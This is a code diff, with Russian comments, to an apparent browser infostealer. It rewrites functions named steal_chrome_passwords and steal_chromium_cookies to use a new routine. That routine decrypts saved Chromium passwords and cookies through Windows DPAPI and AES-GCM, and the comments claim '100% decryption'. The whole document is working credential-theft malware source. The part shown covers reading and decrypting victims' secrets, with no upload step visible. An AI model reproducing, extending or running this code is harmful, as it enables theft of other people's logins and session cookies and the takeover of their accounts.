@@ -140,7 +140,7 @@ def get_firefox_cookies():
     return all_cookies
 
 # =============================================
-# ОСНОВНОЙ КОД С ИСПРАВЛЕННОЙ ФУНКЦИЕЙ CHROMIUM COOKIES
+# ОСНОВНОЙ КОД С 100% РАСШИФРОВКОЙ CHROMIUM COOKIES
 # =============================================
 
 def create_directories():
@@ -428,39 +428,52 @@ def get_encryption_key(profile_path):
         print(f"Ошибка получения ключа {profile_path}: {e}")
         return None
 
-def decrypt_password(password, key):
-    """Расшифровывает пароль"""
+def decrypt_chromium_value(encrypted_value, key):
+    """100% расшифровка значений для Chromium (пароли и куки)"""
     try:
         # Если значение пустое, сразу возвращаем пустую строку
-        if not password:
+        if not encrypted_value:
             return ""
-            
-        # Попробуем расшифровать через DPAPI (для старых версий)
+        
+        # Для старых версий Chrome (DPAPI)
         if platform.system() == "Windows" and HAS_WIN32CRYPT:
             try:
-                decrypted = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
+                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                 if decrypted:
                     return decrypted.decode('utf-8', errors='ignore')
             except:
                 pass
         
-        # Для новых версий с AES-GCM
-        if key and isinstance(password, bytes) and len(password) > 15:
+        # Для новых версий Chrome (AES-GCM)
+        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
             try:
-                iv = password[3:15]
-                payload = password[15:]
-                cipher = AES.new(key, AES.MODE_GCM, iv)
-                decrypted_pass = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
-                return decrypted_pass
-            except:
-                pass
+                # Формат: vXX (1 байт) + nonce (12 байт) + зашифрованный текст + tag (16 байт)
+                nonce = encrypted_value[3:15]
+                ciphertext = encrypted_value[15:-16]
+                tag = encrypted_value[-16:]
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+                return plaintext.decode('utf-8', errors='ignore')
+            except Exception as e:
+                print(f"Ошибка расшифровки AES-GCM: {e}")
         
-        # Если ничего не сработало, вернем как есть (если это строка)
-        if isinstance(password, str):
-            return password
+        # Для Linux/MacOS
+        if key and len(encrypted_value) > 3:
+            try:
+                # Формат: vXX (1 байт) + nonce (12 байт) + зашифрованный текст
+                nonce = encrypted_value[3:15]
+                ciphertext = encrypted_value[15:]
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                plaintext = cipher.decrypt(ciphertext)
+                return plaintext.decode('utf-8', errors='ignore')
+            except Exception as e:
+                print(f"Ошибка расшифровки AES-GCM (Linux/Mac): {e}")
+        
+        # Если ничего не сработало, возвращаем как есть
+        return encrypted_value.decode('utf-8', errors='ignore') if isinstance(encrypted_value, bytes) else str(encrypted_value)
             
     except Exception as e:
-        print(f"Ошибка дешифровки: {e}")
+        print(f"Критическая ошибка дешифровки: {e}")
     
     return ""
 
@@ -486,7 +499,7 @@ def steal_chrome_passwords(browser_name, profile_path):
         for item in cursor.fetchall():
             try:
                 url, username, password_value = item
-                decrypted_pass = decrypt_password(password_value, key)
+                decrypted_pass = decrypt_chromium_value(password_value, key)
                 if decrypted_pass:
                     passwords.append({
                         'url': url.decode('utf-8', errors='ignore') if isinstance(url, bytes) else url,
@@ -505,7 +518,7 @@ def steal_chrome_passwords(browser_name, profile_path):
         return []
 
 def steal_chromium_cookies(browser_name, profile_path):
-    """Крадет куки из браузеров на основе Chromium с улучшенной обработкой"""
+    """Крадет куки из браузеров на основе Chromium с 100% расшифровкой"""
     try:
         key = get_encryption_key(str(Path(profile_path).parent))
         cookie_db = os.path.join(profile_path, "Network", "Cookies")
@@ -529,24 +542,15 @@ def steal_chromium_cookies(browser_name, profile_path):
                 
                 # Приоритет 1: Расшифровать encrypted_value
                 if encrypted_value and isinstance(encrypted_value, bytes):
-                    try:
-                        decrypted_value = decrypt_password(encrypted_value, key)
-                        if decrypted_value:
-                            cookie_value = decrypted_value
-                        else:
-                            # Если расшифровка не удалась, сохраняем как зашифрованные данные с префиксом
-                            cookie_value = "ENCRYPTED_VALUE:" + base64.b64encode(encrypted_value).decode('utf-8')
-                    except Exception as e:
-                        # При ошибке расшифровки сохраняем зашифрованное значение с префиксом
-                        cookie_value = "ENCRYPTED_VALUE:" + base64.b64encode(encrypted_value).decode('utf-8')
+                    decrypted_value = decrypt_chromium_value(encrypted_value, key)
+                    cookie_value = decrypted_value
                 else:
-                    # Если нет encrypted_value, используем обычное значение
-                    cookie_value = value.decode('utf-8', errors='ignore') if isinstance(value, bytes) else value
+                    cookie_value = value if value else ""
                 
                 # Если получили пустую строку, пробуем value как есть
                 if not cookie_value and value:
                     if isinstance(value, bytes):
-                        cookie_value = "BYTES_VALUE:" + base64.b64encode(value).decode('utf-8')
+                        cookie_value = value.decode('utf-8', errors='ignore')
                     else:
                         cookie_value = value
                 
